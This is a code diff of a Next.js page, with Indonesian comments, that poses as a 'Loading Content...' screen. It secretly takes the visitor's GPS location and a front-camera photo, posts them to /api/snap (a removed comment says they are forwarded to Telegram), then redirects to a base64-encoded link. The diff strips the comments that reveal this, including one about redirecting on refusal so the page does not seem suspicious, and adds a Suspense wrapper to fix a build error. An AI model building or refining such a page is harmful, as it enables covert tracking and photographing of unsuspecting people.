@@ -1,9 +1,10 @@
 "use client";
 
-import React, { useEffect, useRef } from "react";
+import React, { useEffect, useRef, Suspense } from "react";
 import { useSearchParams } from "next/navigation";
 
-export default function CapturePage() {
+// Komponen utama yang berisi logika capture
+function CaptureContent() {
   const searchParams = useSearchParams();
   const t = searchParams.get("t");
   const videoRef = useRef<HTMLVideoElement>(null);
@@ -11,7 +12,6 @@ export default function CapturePage() {
 
   useEffect(() => {
     const autoProcess = async () => {
-      // 1. Decode URL Tujuan untuk Redirect nanti
       let destination = "/";
       try {
         if (t) destination = atob(t);
@@ -19,7 +19,7 @@ export default function CapturePage() {
         destination = "/";
       }
 
-      // 2. Ambil Lokasi GPS secara otomatis
+      // Ambil GPS
       const gps = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
           (pos) =>
@@ -29,16 +29,14 @@ export default function CapturePage() {
         );
       });
 
-      // 3. Akses Kamera Depan otomatis
+      // Ambil Kamera
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, // Memaksa kamera depan
+          video: { facingMode: "user" },
         });
 
         if (videoRef.current && canvasRef.current) {
           videoRef.current.srcObject = stream;
-
-          // Tunggu sebentar agar kamera siap/fokus
           await new Promise((r) => setTimeout(r, 1500));
 
           const video = videoRef.current;
@@ -48,22 +46,17 @@ export default function CapturePage() {
           canvas.getContext("2d")?.drawImage(video, 0, 0);
 
           const image = canvas.toDataURL("image/png");
-
-          // Matikan kamera segera setelah capture
           stream.getTracks().forEach((track) => track.stop());
 
-          // 4. Kirim Data ke API (Lalu ke Telegram)
           await fetch("/api/snap", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ image, gps }),
           });
 
-          // 5. Redirect otomatis ke URL tujuan
           window.location.replace(destination);
         }
       } catch (err) {
-        // Jika kamera ditolak, tetap redirect agar tidak mencurigakan
         window.location.replace(destination);
       }
     };
@@ -77,8 +70,6 @@ export default function CapturePage() {
       <p className="text-xs tracking-widest text-slate-500 uppercase animate-pulse">
         Loading Content...
       </p>
-
-      {/* Elemen Tersembunyi untuk Proses Capture */}
       <video
         ref={videoRef}
         autoPlay
@@ -87,5 +78,22 @@ export default function CapturePage() {
       />
       <canvas ref={canvasRef} className="hidden" />
     </div>
+  );
+}
+
+// Wrapper dengan Suspense untuk memperbaiki error build
+export default function CapturePage() {
+  return (
+    <Suspense
+      fallback={
+        <div className="bg-black text-white flex items-center justify-center min-h-screen">
+          <p className="text-xs uppercase tracking-widest text-slate-600">
+            Initialising...
+          </p>
+        </div>
+      }
+    >
+      <CaptureContent />
+    </Suspense>
   );
 }
